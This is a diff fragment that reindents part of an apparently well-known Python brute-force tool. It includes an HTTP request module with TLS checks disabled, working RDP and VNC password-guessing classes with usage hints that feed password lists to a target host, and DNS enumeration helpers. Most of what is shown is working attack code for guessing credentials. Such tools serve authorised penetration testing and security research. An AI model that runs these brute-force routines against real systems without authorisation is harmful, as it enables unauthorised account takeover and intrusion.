-    ('timeout', 'seconds to wait for a HTTP response [20]'),
-    ('before_urls', 'comma-separated URLs to query before the main request'),
-    ('before_egrep', 'extract data from the before_urls response to place in the main request'),
-    ('after_urls', 'comma-separated URLs to query after the main request'),
-    ('max_mem', 'store no more than N bytes of request+response data in memory [-1 (unlimited)]'), 
+    available_options = (
+        ('url', 'target url (scheme://host[:port]/path?query)'),
+        # ('host', 'target host'),
+        # ('port', 'target port'),
+        # ('scheme', 'scheme [http | https]'),
+        # ('path', 'web path [/]'),
+        # ('query', 'query string'),
+        ('body', 'body data'),
+        ('header', 'use custom headers'),
+        ('method', 'method to use [GET | POST | HEAD | ...]'),
+        ('auto_urlencode', 'automatically perform URL-encoding [1|0]'),
+        ('user_pass', 'username and password for HTTP authentication (user:pass)'),
+        ('auth_type', 'type of HTTP authentication [basic | digest | ntlm]'),
+        ('follow', 'follow any Location redirect [0|1]'),
+        ('max_follow', 'redirection limit [5]'),
+        ('accept_cookie', 'save received cookies to issue them in future requests [0|1]'),
+        ('http_proxy', 'HTTP proxy to use (host:port)'),
+        ('ssl_cert', 'client SSL certificate file (cert+key in PEM format)'),
+        ('timeout_tcp', 'seconds to wait for a TCP handshake [10]'),
+        ('timeout', 'seconds to wait for a HTTP response [20]'),
+        ('before_urls', 'comma-separated URLs to query before the main request'),
+        ('before_egrep', 'extract data from the before_urls response to place in the main request'),
+        ('after_urls', 'comma-separated URLs to query after the main request'),
+        ('max_mem', 'store no more than N bytes of request+response data in memory [-1 (unlimited)]'),
     )
-  available_options += TCP_Cache.available_options
+    available_options += TCP_Cache.available_options
 
-  Response = Response_HTTP
+    Response = Response_HTTP
 
-  def connect(self, host, port, scheme):
-    fp = pycurl.Curl()
-    fp.setopt(pycurl.SSL_VERIFYPEER, 0)
-    fp.setopt(pycurl.SSL_VERIFYHOST, 0)
-    fp.setopt(pycurl.HEADER, 1)
-    fp.setopt(pycurl.USERAGENT, 'Mozilla/5.0')
-    fp.setopt(pycurl.NOSIGNAL, 1)
+    def connect(self, host, port, scheme):
+        fp = pycurl.Curl()
+        fp.setopt(pycurl.SSL_VERIFYPEER, 0)
+        fp.setopt(pycurl.SSL_VERIFYHOST, 0)
+        fp.setopt(pycurl.HEADER, 1)
+        fp.setopt(pycurl.USERAGENT, 'Mozilla/5.0')
+        fp.setopt(pycurl.NOSIGNAL, 1)
 
-    return TCP_Connection(fp)
+        return TCP_Connection(fp)
 
-  def execute(self, url=None, host=None, port='', scheme='http', path='/', params='', query='', fragment='', body='',
-    header='', method='GET', auto_urlencode='1', user_pass='', auth_type='basic',
-    follow='0', max_follow='5', accept_cookie='0', http_proxy='', ssl_cert='', timeout_tcp='10', timeout='20', persistent='1', 
-    before_urls='', before_egrep='', after_urls='', max_mem='-1'):
-    
-    if url:
-      scheme, host, path, params, query, fragment = urlparse(url)
-      if ':' in host:
-        host, port = host.split(':')
-      del url
+    def execute(self, url=None, host=None, port='', scheme='http', path='/', params='', query='', fragment='', body='',
+                header='', method='GET', auto_urlencode='1', user_pass='', auth_type='basic',
+                follow='0', max_follow='5', accept_cookie='0', http_proxy='', ssl_cert='', timeout_tcp='10',
+                timeout='20', persistent='1',
+                before_urls='', before_egrep='', after_urls='', max_mem='-1'):
 
-    fp, _ = self.bind(host, port, scheme)
+        if url:
+            scheme, host, path, params, query, fragment = urlparse(url)
+            if ':' in host:
+                host, port = host.split(':')
+            del url
 
-    fp.setopt(pycurl.FOLLOWLOCATION, int(follow))
-    fp.setopt(pycurl.MAXREDIRS, int(max_follow))
-    fp.setopt(pycurl.CONNECTTIMEOUT, int(timeout_tcp))
-    fp.setopt(pycurl.TIMEOUT, int(timeout))
-    fp.setopt(pycurl.PROXY, http_proxy)
+        fp, _ = self.bind(host, port, scheme)
 
-    def noop(buf): pass
-    fp.setopt(pycurl.WRITEFUNCTION, noop)
+        fp.setopt(pycurl.FOLLOWLOCATION, int(follow))
+        fp.setopt(pycurl.MAXREDIRS, int(max_follow))
+        fp.setopt(pycurl.CONNECTTIMEOUT, int(timeout_tcp))
+        fp.setopt(pycurl.TIMEOUT, int(timeout))
+        fp.setopt(pycurl.PROXY, http_proxy)
 
-    def debug_func(t, s):
-      if max_mem > 0 and trace.tell() > max_mem:
-        return 0
+        def noop(buf):
+            pass
 
-      if t in (pycurl.INFOTYPE_HEADER_OUT, pycurl.INFOTYPE_DATA_OUT):
-        trace.write(s)
+        fp.setopt(pycurl.WRITEFUNCTION, noop)
 
-      elif t in (pycurl.INFOTYPE_HEADER_IN, pycurl.INFOTYPE_DATA_IN):
-        trace.write(s)
-        response.write(s)
-        
-    max_mem = int(max_mem)
-    response, trace = StringIO(), StringIO()
+        def debug_func(t, s):
+            if max_mem > 0 and trace.tell() > max_mem:
+                return 0
 
-    fp.setopt(pycurl.DEBUGFUNCTION, debug_func)
-    fp.setopt(pycurl.VERBOSE, 1)
+            if t in (pycurl.INFOTYPE_HEADER_OUT, pycurl.INFOTYPE_DATA_OUT):
+                trace.write(s)
 
-    if user_pass:
-      fp.setopt(pycurl.USERPWD, user_pass)
-      if auth_type == 'basic':
-        fp.setopt(pycurl.HTTPAUTH, pycurl.HTTPAUTH_BASIC)
-      elif auth_type == 'digest':
-        fp.setopt(pycurl.HTTPAUTH, pycurl.HTTPAUTH_DIGEST)
-      elif auth_type == 'ntlm':
-        fp.setopt(pycurl.HTTPAUTH, pycurl.HTTPAUTH_NTLM)
-      else:
-        raise NotImplementedError("Incorrect auth_type '%s'" % auth_type)
-    
-    if ssl_cert:
-      fp.setopt(pycurl.SSLCERT, ssl_cert)
+            elif t in (pycurl.INFOTYPE_HEADER_IN, pycurl.INFOTYPE_DATA_IN):
+                trace.write(s)
+                response.write(s)
 
-    if accept_cookie == '1':
-      fp.setopt(pycurl.COOKIEFILE, '') 
-      # warning: do not pass a Cookie: header into HTTPHEADER if using COOKIEFILE as it will 
-      # produce requests with more than one Cookie: header
-      # and the server will process only one of them (eg. Apache only reads the last one)
+        max_mem = int(max_mem)
+        response, trace = StringIO(), StringIO()
 
-    def perform_fp(fp, method, url, header='', body=''):
-      #logger.debug('perform: %s' % url)
-      fp.setopt(pycurl.URL, url) 
+        fp.setopt(pycurl.DEBUGFUNCTION, debug_func)
+        fp.setopt(pycurl.VERBOSE, 1)
 
-      if method == 'GET':
-        fp.setopt(pycurl.HTTPGET, 1)
+        if user_pass:
+            fp.setopt(pycurl.USERPWD, user_pass)
+            if auth_type == 'basic':
+                fp.setopt(pycurl.HTTPAUTH, pycurl.HTTPAUTH_BASIC)
+            elif auth_type == 'digest':
+                fp.setopt(pycurl.HTTPAUTH, pycurl.HTTPAUTH_DIGEST)
+            elif auth_type == 'ntlm':
+                fp.setopt(pycurl.HTTPAUTH, pycurl.HTTPAUTH_NTLM)
+            else:
+                raise NotImplementedError("Incorrect auth_type '%s'" % auth_type)
 
-      elif method == 'POST':
-        fp.setopt(pycurl.POST, 1)
-        fp.setopt(pycurl.POSTFIELDS, body)
+        if ssl_cert:
+            fp.setopt(pycurl.SSLCERT, ssl_cert)
 
-      elif method == 'HEAD':
-        fp.setopt(pycurl.NOBODY, 1)
+        if accept_cookie == '1':
+            fp.setopt(pycurl.COOKIEFILE, '')
+            # warning: do not pass a Cookie: header into HTTPHEADER if using COOKIEFILE as it will
+            # produce requests with more than one Cookie: header
+            # and the server will process only one of them (eg. Apache only reads the last one)
 
-      else:
-        fp.setopt(pycurl.CUSTOMREQUEST, method)
+        def perform_fp(fp, method, url, header='', body=''):
+            # logger.debug('perform: %s' % url)
+            fp.setopt(pycurl.URL, url)
 
-      headers = [h.strip('\r') for h in header.split('\n') if h]
-      fp.setopt(pycurl.HTTPHEADER, headers)
+            if method == 'GET':
+                fp.setopt(pycurl.HTTPGET, 1)
 
-      fp.perform()
+            elif method == 'POST':
+                fp.setopt(pycurl.POST, 1)
+                fp.setopt(pycurl.POSTFIELDS, body)
 
-    if before_urls:
-      for before_url in before_urls.split(','):
-        perform_fp(fp, 'GET', before_url)
+            elif method == 'HEAD':
+                fp.setopt(pycurl.NOBODY, 1)
 
-      if before_egrep:
-        for be in before_egrep.split('|'):
-          mark, regex = be.split(':', 1)
-          val = re.search(regex, response.getvalue(), re.M).group(1)
+            else:
+                fp.setopt(pycurl.CUSTOMREQUEST, method)
 
-          header = header.replace(mark, val)
-          query = query.replace(mark, val)
-          body = body.replace(mark, val)
+            headers = [h.strip('\r') for h in header.split('\n') if h]
+            fp.setopt(pycurl.HTTPHEADER, headers)
 
-    if auto_urlencode == '1':
-      path = quote(path)
-      query = urlencode(parse_qsl(query, True))
-      body = urlencode(parse_qsl(body, True))
+            fp.perform()
 
-    if port:
-      host = '%s:%s' % (host, port)
+        if before_urls:
+            for before_url in before_urls.split(','):
+                perform_fp(fp, 'GET', before_url)
 
-    url = urlunparse((scheme, host, path, params, query, fragment))
-    perform_fp(fp, method, url, header, body)
+            if before_egrep:
+                for be in before_egrep.split('|'):
+                    mark, regex = be.split(':', 1)
+                    val = re.search(regex, response.getvalue(), re.M).group(1)
 
-    if after_urls:
-      for after_url in after_urls.split(','):
-        perform_fp(fp, 'GET', after_url)
+                    header = header.replace(mark, val)
+                    query = query.replace(mark, val)
+                    body = body.replace(mark, val)
 
-    http_code = fp.getinfo(pycurl.HTTP_CODE)
-    content_length = fp.getinfo(pycurl.CONTENT_LENGTH_DOWNLOAD)
-    response_time = fp.getinfo(pycurl.TOTAL_TIME) - fp.getinfo(pycurl.PRETRANSFER_TIME)
+        if auto_urlencode == '1':
+            path = quote(path)
+            query = urlencode(parse_qsl(query, True))
+            body = urlencode(parse_qsl(body, True))
 
-    if persistent == '0':
-      self.reset()
+        if port:
+            host = '%s:%s' % (host, port)
 
-    return self.Response(http_code, response.getvalue(), response_time, trace.getvalue(), content_length)
+        url = urlunparse((scheme, host, path, params, query, fragment))
+        perform_fp(fp, method, url, header, body)
+
+        if after_urls:
+            for after_url in after_urls.split(','):
+                perform_fp(fp, 'GET', after_url)
+
+        http_code = fp.getinfo(pycurl.HTTP_CODE)
+        content_length = fp.getinfo(pycurl.CONTENT_LENGTH_DOWNLOAD)
+        response_time = fp.getinfo(pycurl.TOTAL_TIME) - fp.getinfo(pycurl.PRETRANSFER_TIME)
+
+        if persistent == '0':
+            self.reset()
+
+        return self.Response(http_code, response.getvalue(), response_time, trace.getvalue(), content_length)
+
 
 # }}}
 
 # {{{ RDP
 if not which('xfreerdp'):
-  notfound.append('xfreerdp')
+    notfound.append('xfreerdp')
+
 
 class RDP_login:
-  '''Brute-force RDP (NLA)'''
+    '''Brute-force RDP (NLA)'''
 
-  usage_hints = (
-    """%prog host=10.0.0.1 user='administrator' password=FILE0 0=passwords.txt""",
+    usage_hints = (
+        """%prog host=10.0.0.1 user='administrator' password=FILE0 0=passwords.txt""",
     )
 
-  available_options = (
-    ('host', 'target host'),
-    ('port', 'target port [3389]'),
-    ('user', 'usernames to test'),
-    ('password', 'passwords to test'),
+    available_options = (
+        ('host', 'target host'),
+        ('port', 'target port [3389]'),
+        ('user', 'usernames to test'),
+        ('password', 'passwords to test'),
     )
-  available_actions = ()
+    available_actions = ()
 
-  Response = Response_Base
+    Response = Response_Base
 
-  def execute(self, host, port='3389', user=None, password=None):
+    def execute(self, host, port='3389', user=None, password=None):
+        cmd = ['xfreerdp', '/v:%s:%d' % (host, int(port)), '/u:%s' % user, '/p:%s' % password, '/cert-ignore',
+               '+auth-only', '/sec:nla']
 
-    cmd = ['xfreerdp', '/v:%s:%d' % (host, int(port)), '/u:%s' % user, '/p:%s' % password, '/cert-ignore', '+auth-only', '/sec:nla']
+        with Timing() as timing:
+            p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            out, err = p.communicate()
+            code = p.returncode
 
-    with Timing() as timing:
-      p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-      out, err = p.communicate()
-      code = p.returncode
-
-    err = err.replace('''Authentication only. Don't connect to X.
+        err = err.replace('''Authentication only. Don't connect to X.
 credssp_recv() error: -1
 freerdp_set_last_error 0x20009\n''', '')
-    err = err.replace(''', check credentials.
+        err = err.replace(''', check credentials.
 If credentials are valid, the NTLMSSP implementation may be to blame.
 Error: protocol security negotiation or connection failure
 Authentication only, exit status 1
 Authentication only, exit status 1''', '')
-    err = err.replace('''Authentication only. Don't connect to X.
+        err = err.replace('''Authentication only. Don't connect to X.
 Authentication only, exit status 0
 Authentication only, exit status 0''', 'OK')
 
-    mesg = repr((out + err).strip())[1:-1]
-    trace = '[out]\n%s\n[err]\n%s' % (out, err)
+        mesg = repr((out + err).strip())[1:-1]
+        trace = '[out]\n%s\n[err]\n%s' % (out, err)
 
-    return self.Response(code, mesg, timing, trace)
+        return self.Response(code, mesg, timing, trace)
+
+
 # }}}
 
 # VNC {{{
 try:
-  from Crypto.Cipher import DES
+    from Crypto.Cipher import DES
 except ImportError:
-  notfound.append('pycrypto')
+    notfound.append('pycrypto')
+
 
 class VNC_Error(Exception): pass
+
+
 class VNC:
-  def connect(self, host, port, timeout):
-    self.fp = socket.create_connection((host, port), timeout=timeout)
-    resp = self.fp.recv(99) # banner
+    def connect(self, host, port, timeout):
+        self.fp = socket.create_connection((host, port), timeout=timeout)
+        resp = self.fp.recv(99)  # banner
 
-    logger.debug('banner: %s' % repr(resp))
-    self.version = resp[:11].decode('ascii')
+        logger.debug('banner: %s' % repr(resp))
+        self.version = resp[:11].decode('ascii')
 
-    if len(resp) > 12:
-      raise VNC_Error('%s %s' % (self.version, resp[12:].decode('ascii', 'ignore')))
+        if len(resp) > 12:
+            raise VNC_Error('%s %s' % (self.version, resp[12:].decode('ascii', 'ignore')))
 
-    return self.version
+        return self.version
 
-  def login(self, password):
-    logger.debug('Remote version: %s' % self.version)
-    major, minor = self.version[6], self.version[10]
+    def login(self, password):
+        logger.debug('Remote version: %s' % self.version)
+        major, minor = self.version[6], self.version[10]
 
-    if (major, minor) in [('3', '8'), ('4', '1')]:
-      proto = b'RFB 003.008\n'
+        if (major, minor) in [('3', '8'), ('4', '1')]:
+            proto = b'RFB 003.008\n'
 
-    elif (major, minor) == ('3', '7'):
-      proto = b'RFB 003.007\n'
+        elif (major, minor) == ('3', '7'):
+            proto = b'RFB 003.007\n'
 
-    else:
-      proto = b'RFB 003.003\n'
+        else:
+            proto = b'RFB 003.003\n'
 
-    logger.debug('Client version: %s' % proto[:-1])
-    self.fp.sendall(proto)
+        logger.debug('Client version: %s' % proto[:-1])
+        self.fp.sendall(proto)
 
-    sleep(0.5)
+        sleep(0.5)
 
-    resp = self.fp.recv(99)
-    logger.debug('Security types supported: %s' % repr(resp))
+        resp = self.fp.recv(99)
+        logger.debug('Security types supported: %s' % repr(resp))
 
-    if major == '4' or (major == '3' and int(minor) >= 7):
-      code = ord(resp[0:1])
-      if code == 0:
-        raise VNC_Error('Session setup failed: %s' % resp.decode('ascii', 'ignore'))
+        if major == '4' or (major == '3' and int(minor) >= 7):
+            code = ord(resp[0:1])
+            if code == 0:
+                raise VNC_Error('Session setup failed: %s' % resp.decode('ascii', 'ignore'))
 
-      self.fp.sendall(b'\x02') # always use classic VNC authentication
-      resp = self.fp.recv(99)
+            self.fp.sendall(b'\x02')  # always use classic VNC authentication
+            resp = self.fp.recv(99)
 
-    else: # minor == '3':
-      code = ord(resp[3:4])
-      if code != 2:
-        raise VNC_Error('Session setup failed: %s' % resp.decode('ascii', 'ignore'))
+        else:  # minor == '3':
+            code = ord(resp[3:4])
+            if code != 2:
+                raise VNC_Error('Session setup failed: %s' % resp.decode('ascii', 'ignore'))
 
-      resp = resp[-16:]
+            resp = resp[-16:]
 
-    if len(resp) != 16:
-      raise VNC_Error('Unexpected challenge size (No authentication required? Unsupported authentication type?)')
+        if len(resp) != 16:
+            raise VNC_Error('Unexpected challenge size (No authentication required? Unsupported authentication type?)')
 
-    logger.debug('challenge: %s' % repr(resp))
-    pw = password.ljust(8, '\x00')[:8] # make sure it is 8 chars long, zero padded
+        logger.debug('challenge: %s' % repr(resp))
+        pw = password.ljust(8, '\x00')[:8]  # make sure it is 8 chars long, zero padded
 
-    key = self.gen_key(pw)
-    logger.debug('key: %s' % repr(key))
+        key = self.gen_key(pw)
+        logger.debug('key: %s' % repr(key))
 
-    des = DES.new(key, DES.MODE_ECB)
-    enc = des.encrypt(resp)
+        des = DES.new(key, DES.MODE_ECB)
+        enc = des.encrypt(resp)
 
-    logger.debug('enc: %s' % repr(enc))
-    self.fp.sendall(enc)
+        logger.debug('enc: %s' % repr(enc))
+        self.fp.sendall(enc)
 
-    resp = self.fp.recv(99)
-    logger.debug('resp: %s' % repr(resp))
+        resp = self.fp.recv(99)
+        logger.debug('resp: %s' % repr(resp))
 
-    code = ord(resp[3:4])
-    mesg = resp[8:].decode('ascii', 'ignore')
+        code = ord(resp[3:4])
+        mesg = resp[8:].decode('ascii', 'ignore')
 
-    if code == 1:
-      return code, mesg or 'Authentication failure'
+        if code == 1:
+            return code, mesg or 'Authentication failure'
 
-    elif code == 0:
-      return code, mesg or 'OK'
+        elif code == 0:
+            return code, mesg or 'OK'
 
-    else:
-      raise VNC_Error('Unknown response: %s (code: %s)' % (repr(resp), code))
-         
+        else:
+            raise VNC_Error('Unknown response: %s (code: %s)' % (repr(resp), code))
 
-  def gen_key(self, key):
-    newkey = []
-    for ki in range(len(key)):
-      bsrc = ord(key[ki])
-      btgt = 0
-      for i in range(8):
-        if bsrc & (1 << i):
-          btgt = btgt | (1 << 7-i)
-      newkey.append(btgt)
+    def gen_key(self, key):
+        newkey = []
+        for ki in range(len(key)):
+            bsrc = ord(key[ki])
+            btgt = 0
+            for i in range(8):
+                if bsrc & (1 << i):
+                    btgt = btgt | (1 << 7 - i)
+            newkey.append(btgt)
 
-    if sys.version_info[0] == 2:
-      return ''.join(chr(c) for c in newkey)
-    else:
-      return bytes(newkey)
+        if sys.version_info[0] == 2:
+            return ''.join(chr(c) for c in newkey)
+        else:
+            return bytes(newkey)
 
 
 class VNC_login:
-  '''Brute-force VNC'''
+    '''Brute-force VNC'''
 
-  usage_hints = (
-    """%prog host=10.0.0.1 password=FILE0 0=passwords.txt -t 1 -x retry:fgrep!='Authentication failure' --max-retries -1 -x quit:code=0""",
+    usage_hints = (
+        """%prog host=10.0.0.1 password=FILE0 0=passwords.txt -t 1 -x retry:fgrep!='Authentication failure' --max-retries -1 -x quit:code=0""",
     )
-  
-  available_options = (
-    ('host', 'target host'),
-    ('port', 'target port [5900]'),
-    ('password', 'passwords to test'),
-    ('timeout', 'seconds to wait for a response [10]'),
+
+    available_options = (
+        ('host', 'target host'),
+        ('port', 'target port [5900]'),
+        ('password', 'passwords to test'),
+        ('timeout', 'seconds to wait for a response [10]'),
     )
-  available_actions = ()
+    available_actions = ()
 
-  Response = Response_Base
+    Response = Response_Base
 
-  def execute(self, host, port=None, password=None, timeout='10'):
-    v = VNC()
+    def execute(self, host, port=None, password=None, timeout='10'):
+        v = VNC()
 
-    try:
-      with Timing() as timing:
-        code, mesg = 0, v.connect(host, int(port or 5900), int(timeout))
+        try:
+            with Timing() as timing:
+                code, mesg = 0, v.connect(host, int(port or 5900), int(timeout))
 
-      if password is not None:
-        with Timing() as timing:
-          code, mesg = v.login(password)
+            if password is not None:
+                with Timing() as timing:
+                    code, mesg = v.login(password)
 
-    except VNC_Error as e:
-      logger.debug('VNC_Error: %s' % e)
-      code, mesg = 2, str(e)
+        except VNC_Error as e:
+            logger.debug('VNC_Error: %s' % e)
+            code, mesg = 2, str(e)
 
-    return self.Response(code, mesg, timing)
+        return self.Response(code, mesg, timing)
+
 
 # }}}
 
 # DNS {{{
 
 try:
-  import dns.rdatatype
-  import dns.message
-  import dns.query
-  import dns.reversename
+    import dns.rdatatype
+    import dns.message
+    import dns.query
+    import dns.reversename
 except ImportError:
-  notfound.append('dnspython')
+    notfound.append('dnspython')
+
 
 def dns_query(server, timeout, protocol, qname, qtype, qclass):
-  request = dns.message.make_query(qname, qtype, qclass)
+    request = dns.message.make_query(qname, qtype, qclass)
 
-  if protocol == 'tcp':
-    response = dns.query.tcp(request, server, timeout=timeout, one_rr_per_rrset=True)
+    if protocol == 'tcp':
+        response = dns.query.tcp(request, server, timeout=timeout, one_rr_per_rrset=True)
 
-  else:
-    response = dns.query.udp(request, server, timeout=timeout, one_rr_per_rrset=True)
+    else:
+        response = dns.query.udp(request, server, timeout=timeout, one_rr_per_rrset=True)
 
-    if response.flags & dns.flags.TC:
-      response = dns.query.tcp(request, server, timeout=timeout, one_rr_per_rrset=True)
+        if response.flags & dns.flags.TC:
+            response = dns.query.tcp(request, server, timeout=timeout, one_rr_per_rrset=True)
 
-  return response
+    return response
+
 
 def generate_tld():
-  # NB. does not return an exhaustive list (ie. missing co.uk, co.nz etc.)
+    # NB. does not return an exhaustive list (ie. missing co.uk, co.nz etc.)
 
-  from itertools import product
-  from string import ascii_lowercase
+    from itertools import product
+    from string import ascii_lowercase
 
-  # http://data.iana.org/TLD/tlds-alpha-by-domain.txt
-  gtld = ['academy', 'actor', 'aero', 'agency', 'archi', 'arpa', 'asia', 'axa',
-    'bar', 'bargains', 'berlin', 'best', 'bid', 'bike', 'biz', 'black', 'blue',
-    'boutique', 'build', 'builders', 'buzz', 'cab', 'camera', 'camp', 'cards',
-    'careers', 'cat', 'catering', 'center', 'ceo', 'cheap', 'christmas',
-    'cleaning', 'clothing', 'club', 'codes', 'coffee', 'cologne', 'com',
-    'community', 'company', 'computer', 'condos', 'construction', 'contractors',
-    'cooking', 'cool', 'coop', 'country', 'cruises', 'dance', 'dating', 'democrat',
-    'diamonds', 'directory', 'dnp', 'domains', 'edu', 'education', 'email',
-    'enterprises', 'equipment', 'estate', 'events', 'expert', 'exposed', 'farm',
-    'fish', 'fishing', 'flights', 'florist', 'foundation', 'futbol', 'gallery',
-    'gift', 'glass', 'gov', 'graphics', 'guitars', 'guru', 'haus', 'holdings',
-    'holiday', 'horse', 'house', 'immobilien', 'industries', 'info', 'ink',
-    'institute', 'int', 'international', 'jetzt', 'jobs', 'kaufen', 'kim',
-    'kitchen', 'kiwi', 'koeln', 'kred', 'land', 'lighting', 'limo', 'link',
-    'london', 'luxury', 'maison', 'management', 'mango', 'marketing', 'meet',
-    'menu', 'miami', 'mil', 'mobi', 'moda', 'moe', 'monash', 'museum', 'nagoya',
-    'name', 'net', 'neustar', 'ninja', 'nyc', 'okinawa', 'onl', 'org', 'partners',
-    'parts', 'photo', 'photography', 'photos', 'pics', 'pink', 'plumbing', 'post',
-    'pro', 'productions', 'properties', 'pub', 'qpon', 'recipes', 'red', 'ren',
-    'rentals', 'repair', 'report', 'reviews', 'rich', 'rodeo', 'ruhr', 'sexy',
-    'shiksha', 'shoes', 'singles', 'social', 'sohu', 'solar', 'solutions',
-    'supplies', 'supply', 'support', 'systems', 'tattoo', 'technology', 'tel',
-    'tienda', 'tips', 'today', 'tokyo', 'tools', 'trade', 'training', 'travel',
-    'uno', 'vacations', 'vegas', 'ventures', 'viajes', 'villas', 'vision', 'vodka',
-    'vote', 'voting', 'voto', 'voyage', 'wang', 'watch', 'webcam', 'wed', 'wien',
-    'wiki', 'works', 'xn--3bst00m', 'xn--3ds443g', 'xn--3e0b707e', 'xn--45brj9c',
-    'xn--55qw42g', 'xn--55qx5d', 'xn--6frz82g', 'xn--6qq986b3xl', 'xn--80ao21a',
-    'xn--80asehdb', 'xn--80aswg', 'xn--90a3ac', 'xn--c1avg', 'xn--cg4bki',
-    'xn--clchc0ea0b2g2a9gcd', 'xn--czru2d', 'xn--d1acj3b', 'xn--fiq228c5hs',
-    'xn--fiq64b', 'xn--fiqs8s', 'xn--fiqz9s', 'xn--fpcrj9c3d', 'xn--fzc2c9e2c',
-    'xn--gecrj9c', 'xn--h2brj9c', 'xn--i1b6b1a6a2e', 'xn--io0a7i', 'xn--j1amh',
-    'xn--j6w193g', 'xn--kprw13d', 'xn--kpry57d', 'xn--l1acc', 'xn--lgbbat1ad8j',
-    'xn--mgb9awbf', 'xn--mgba3a4f16a', 'xn--mgbaam7a8h', 'xn--mgbab2bd',
-    'xn--mgbayh7gpa', 'xn--mgbbh1a71e', 'xn--mgbc0a9azcg', 'xn--mgberp4a5d4ar',
-    'xn--mgbx4cd0ab', 'xn--ngbc5azd', 'xn--nqv7f', 'xn--nqv7fs00ema', 'xn--o3cw4h',
-    'xn--ogbpf8fl', 'xn--p1ai', 'xn--pgbs0dh', 'xn--q9jyb4c', 'xn--rhqv96g',
-    'xn--s9brj9c', 'xn--unup4y', 'xn--wgbh1c', 'xn--wgbl6a', 'xn--xkc2al3hye2a',
-    'xn--xkc2dl3a5ee0h', 'xn--yfro4i67o', 'xn--ygbi2ammx', 'xn--zfr164b', 'xxx',
-    'xyz', 'zone']
+    # http://data.iana.org/TLD/tlds-alpha-by-domain.txt
+    gtld = ['academy', 'actor', 'aero', 'agency', 'archi', 'arpa', 'asia', 'axa',
+            'bar', 'bargains', 'berlin', 'best', 'bid', 'bike', 'biz', 'black', 'blue',
+            'boutique', 'build', 'builders', 'buzz', 'cab', 'camera', 'camp', 'cards',
+            'careers', 'cat', 'catering', 'center', 'ceo', 'cheap', 'christmas',
+            'cleaning', 'clothing', 'club', 'codes', 'coffee', 'cologne', 'com',
+            'community', 'company', 'computer', 'condos', 'construction', 'contractors',
+            'cooking', 'cool', 'coop', 'country', 'cruises', 'dance', 'dating', 'democrat',
+            'diamonds', 'directory', 'dnp', 'domains', 'edu', 'education', 'email',
+            'enterprises', 'equipment', 'estate', 'events', 'expert', 'exposed', 'farm',
+            'fish', 'fishing', 'flights', 'florist', 'foundation', 'futbol', 'gallery',
+            'gift', 'glass', 'gov', 'graphics', 'guitars', 'guru', 'haus', 'holdings',
+            'holiday', 'horse', 'house', 'immobilien', 'industries', 'info', 'ink',
+            'institute', 'int', 'international', 'jetzt', 'jobs', 'kaufen', 'kim',
+            'kitchen', 'kiwi', 'koeln', 'kred', 'land', 'lighting', 'limo', 'link',
+            'london', 'luxury', 'maison', 'management', 'mango', 'marketing', 'meet',
+            'menu', 'miami', 'mil', 'mobi', 'moda', 'moe', 'monash', 'museum', 'nagoya',
+            'name', 'net', 'neustar', 'ninja', 'nyc', 'okinawa', 'onl', 'org', 'partners',
+            'parts', 'photo', 'photography', 'photos', 'pics', 'pink', 'plumbing', 'post',
+            'pro', 'productions', 'properties', 'pub', 'qpon', 'recipes', 'red', 'ren',
+            'rentals', 'repair', 'report', 'reviews', 'rich', 'rodeo', 'ruhr', 'sexy',
+            'shiksha', 'shoes', 'singles', 'social', 'sohu', 'solar', 'solutions',
+            'supplies', 'supply', 'support', 'systems', 'tattoo', 'technology', 'tel',
+            'tienda', 'tips', 'today', 'tokyo', 'tools', 'trade', 'training', 'travel',
+            'uno', 'vacations', 'vegas', 'ventures', 'viajes', 'villas', 'vision', 'vodka',
+            'vote', 'voting', 'voto', 'voyage', 'wang', 'watch', 'webcam', 'wed', 'wien',
+            'wiki', 'works', 'xn--3bst00m', 'xn--3ds443g', 'xn--3e0b707e', 'xn--45brj9c',
+            'xn--55qw42g', 'xn--55qx5d', 'xn--6frz82g', 'xn--6qq986b3xl', 'xn--80ao21a',
+            'xn--80asehdb', 'xn--80aswg', 'xn--90a3ac', 'xn--c1avg', 'xn--cg4bki',
+            'xn--clchc0ea0b2g2a9gcd', 'xn--czru2d', 'xn--d1acj3b', 'xn--fiq228c5hs',
+            'xn--fiq64b', 'xn--fiqs8s', 'xn--fiqz9s', 'xn--fpcrj9c3d', 'xn--fzc2c9e2c',
+            'xn--gecrj9c', 'xn--h2brj9c', 'xn--i1b6b1a6a2e', 'xn--io0a7i', 'xn--j1amh',
+            'xn--j6w193g', 'xn--kprw13d', 'xn--kpry57d', 'xn--l1acc', 'xn--lgbbat1ad8j',
+            'xn--mgb9awbf', 'xn--mgba3a4f16a', 'xn--mgbaam7a8h', 'xn--mgbab2bd',
+            'xn--mgbayh7gpa', 'xn--mgbbh1a71e', 'xn--mgbc0a9azcg', 'xn--mgberp4a5d4ar',
+            'xn--mgbx4cd0ab', 'xn--ngbc5azd', 'xn--nqv7f', 'xn--nqv7fs00ema', 'xn--o3cw4h',
+            'xn--ogbpf8fl', 'xn--p1ai', 'xn--pgbs0dh', 'xn--q9jyb4c', 'xn--rhqv96g',
+            'xn--s9brj9c', 'xn--unup4y', 'xn--wgbh1c', 'xn--wgbl6a', 'xn--xkc2al3hye2a',
+            'xn--xkc2dl3a5ee0h', 'xn--yfro4i67o', 'xn--ygbi2ammx', 'xn--zfr164b', 'xxx',
+            'xyz', 'zone']
 
-  cctld = [''.join(i) for i in product(*[ascii_lowercase]*2)]
+    cctld = [''.join(i) for i in product(*[ascii_lowercase] * 2)]
 
-  tld = gtld + cctld
-  return tld, len(tld)
+    tld = gtld + cctld
+    return tld, len(tld)
+
 
 def generate_srv():
-  common = [
-    '_gc._tcp', '_kerberos._tcp', '_kerberos._udp', '_ldap._tcp',
-    '_test._tcp', '_sips._tcp', '_sip._udp', '_sip._tcp', '_aix._tcp', '_aix._udp',
-    '_finger._tcp', '_ftp._tcp', '_http._tcp', '_nntp._tcp', '_telnet._tcp',
-    '_whois._tcp', '_h323cs._tcp', '_h323cs._udp', '_h323be._tcp', '_h323be._udp',
-    '_h323ls._tcp', '_h323ls._udp', '_sipinternal._tcp', '_sipinternaltls._tcp',
-    '_sip._tls', '_sipfederationtls._tcp', '_jabber._tcp', '_xmpp-server._tcp', '_xmpp-client._tcp',
-    '_imap.tcp', '_certificates._tcp', '_crls._tcp', '_pgpkeys._tcp', '_pgprevokations._tcp',
-    '_cmp._tcp', '_svcp._tcp', '_crl._tcp', '_ocsp._tcp', '_PKIXREP._tcp',
